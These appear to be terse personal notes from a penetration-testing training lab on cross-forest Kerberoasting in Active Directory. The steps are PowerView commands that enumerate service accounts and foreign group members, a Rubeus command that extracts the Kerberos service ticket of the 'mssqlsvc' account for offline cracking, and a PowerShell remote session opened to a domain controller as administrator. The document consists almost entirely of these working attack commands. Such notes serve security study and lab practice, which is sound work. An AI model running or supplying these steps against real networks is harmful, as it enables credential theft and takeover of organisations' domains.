# Cross Forest Kerberoasting
#### Look for accounts
`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName`

#### Then see what they are a member of
`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof`

#### Using Rubeus
`.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
Also found the path needed for later
#### Enumerating groups of the domain
`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
`Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500`

#### Using PSSession
`Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`
